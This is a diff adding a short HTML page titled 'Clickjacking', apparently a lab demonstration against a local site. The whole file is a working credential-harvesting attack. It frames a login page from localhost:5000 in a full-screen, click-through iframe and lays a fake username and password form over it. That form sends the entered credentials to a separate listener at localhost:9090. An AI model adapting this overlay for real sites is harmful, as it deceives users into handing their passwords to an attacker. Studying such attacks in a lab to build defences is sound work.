@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Clickjacking</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      border: none;
+      pointer-events: none;
+    }
+
+    form {
+      position: absolute;
+      top: 68px;
+      left: 7px;
+      z-index: 2;
+    }
+  </style>
+</head>
+<body>
+
+  <iframe src="http://localhost:5000/"></iframe>
+
+  <form method="POST" action="http://localhost:9090">
+    <br>
+    <input type="text" name="username" required><br><br><br>
+    <input type="password" name="password" required><br><br>
+    <button type="submit">Entrar</button>
+  </form>
+
+</body>
+</html>
